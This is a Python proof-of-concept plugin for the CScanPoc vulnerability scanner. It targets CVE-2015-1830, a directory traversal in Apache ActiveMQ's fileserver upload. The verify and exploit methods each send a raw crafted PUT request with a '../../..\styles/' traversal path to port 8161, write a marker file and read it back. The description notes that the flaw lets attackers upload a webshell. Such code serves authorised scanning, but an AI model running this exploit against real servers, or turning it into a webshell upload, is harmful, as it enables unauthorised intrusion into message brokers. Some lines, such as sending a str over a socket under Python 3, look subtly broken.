# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import socket
import time
import urllib.request
import urllib.error
import urllib.parse
import random


class Vuln(ABVuln):
    vuln_id = 'Apache-ActiveMQ_0000'  # 平台漏洞编号
    name = 'Apache-ActiveMQ upload/download功能目录遍历'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_UPLOAD  # 漏洞类型
    disclosure_date = '2015-08-17'  # 漏洞公布时间
    desc = '''
        Apache ActiveMQ是流行的消息传输和集成模式提供程序，攻击者通过此漏洞可直接上传webshell，进而入侵控制服务器。
    '''  # 漏洞描述
    ref = 'https://www.exploit-db.com/exploits/40857/'  # https://www.exploit-db.com/exploits/40857/
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'CVE-2015-1830'  # cve编号
    product = 'Apache-ActiveMQ'  # 漏洞组件名称
    product_version = '5.11.1/5.13.2'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'c71e88de-b610-41fd-8554-6b002c455057'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-01'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def random_str(self, len):
        str1 = ""
        for i in range(len):
            str1 += (random.choice("ABCDEFGH1234567890"))
        return str1

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        # 这里是输入ip进行测试，不需要输入 http:// 或者直接输入域名也可以 不加 http://
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            timeout = 5
            port = 8161
            ip = '{target}'.format(target=self.target)
            socket.setdefaulttimeout(timeout)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            filename = self.random_str(6)
            flag = "PUT /fileserver/sex../../..\\styles/%s.txt HTTP/1.0\r\nContent-Length: 9\r\n\r\ncscan233\r\n\r\n" % (
                filename)
            s.send(flag)
            time.sleep(1)
            s.recv(1024)
            s.close()
            url = 'http://' + ip + ":" + \
                str(port) + '/styles/%s.txt' % (filename)
            res_html = urllib.request.urlopen(url, timeout=timeout).read(1024)
            if 'cscan233' in res_html:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                target=self.target, vuln=self.vuln))
            timeout = 5
            port = 8161
            ip = '{target}'.format(target=self.target)
            socket.setdefaulttimeout(timeout)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            filename = self.random_str(6)
            flag = "PUT /fileserver/sex../../..\\styles/%s.txt HTTP/1.0\r\nContent-Length: 9\r\n\r\ncscan233\r\n\r\n" % (
                filename)
            s.send(flag)
            time.sleep(1)
            s.recv(1024)
            s.close()
            url = 'http://' + ip + ":" + \
                str(port) + '/styles/%s.txt' % (filename)
            res_html = urllib.request.urlopen(url, timeout=timeout).read(1024)
            if 'cscan233' in res_html:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，获取到的上次测试文件地址为{url}'.format(
                    target=self.target, name=self.vuln.name, url=url))
        except Exception as e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
